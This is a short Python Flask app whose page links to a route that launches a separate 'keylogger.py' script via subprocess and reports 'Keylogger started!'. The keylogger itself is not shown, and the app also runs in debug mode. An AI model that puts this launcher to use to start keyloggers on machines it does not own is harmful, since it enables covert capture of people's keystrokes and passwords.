from flask import Flask
import os
import subprocess

app = Flask(__name__)

@app.route('/')
def index():
    return '<a href="/start">Click here to start the keylogger</a>'

@app.route('/start')
def start_keylogger():
    # Replace this with the code you want to run
    subprocess.Popen(['python', 'keylogger.py'])  # This runs the keylogger.py script
    return "Keylogger started!"

if __name__ == '__main__':
    app.run(debug=True)
